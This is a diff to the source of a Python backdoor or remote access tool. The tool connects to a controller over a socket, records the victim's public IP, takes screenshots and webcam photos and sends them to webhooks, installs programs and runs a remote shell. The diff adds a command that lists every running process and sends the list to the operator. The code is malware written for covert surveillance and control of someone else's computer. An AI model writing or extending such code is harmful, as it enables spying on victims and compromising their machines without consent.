@@ -3,6 +3,7 @@ import os
 import socket
 import subprocess
 import time
+import psutil
 import ctypes
 import pynput
 import requests
@@ -24,11 +25,12 @@ ipadd = get('https://api.ipify.org').text
 class back:
     def help_desk(self):
         self.help_ = ("===========================================================\n"+
-                    "|| 1.) bye             -- To close the session             ||\n"+
-                    "|| 2.) reconn          -- To reconnect to the SS server.   ||\n"+
-                    "|| 3.) screen webhook  -- To take screenshot.              ||\n"+
-                    "|| 4.) cam webhook     -- To take webcam photo.            ||\n"+
-                    "|| 5.) install         -- To install any program.          ||\n"
+                    "|| 1.) bye              -- To close the session             ||\n"+
+                    "|| 2.) reconn           -- To reconnect to the SS server.   ||\n"+
+                    "|| 3.) screen -webhook  -- To take screenshot.              ||\n"+
+                    "|| 4.) cam -webhook     -- To take webcam photo.            ||\n"+
+                    "|| 5.) list -id         -- To list the process id.          ||\n"+
+                    "|| 6.) install          -- To install any program.          ||\n"
                     "===========================================================\n")
         s.send(self.help_.encode())
 
@@ -57,6 +59,19 @@ class back:
             os.remove("2.png")
         else:
             s.send(b"No image detected. Please! try again")
+
+    def process_id(self):
+        num = 1
+        for proc in psutil.process_iter():
+            try:
+                processName = proc.name()
+                processID = proc.pid
+                for_send = f"{num}. {processName} ::: {processID}\n"
+                num +=1
+                print(for_send)
+                s.send(for_send.encode())
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
                 
     def shell(self):
         while True:
@@ -83,7 +98,9 @@ class back:
                 time.sleep(0.5)
                 xi = cmd[7:-1]
                 self.webcam(xi)
-
+            
+            elif (cmd[:4] == "list"):
+                self.process_id()
             elif (cmd[:6] == "reconn"):
                 self.reconnect()
 
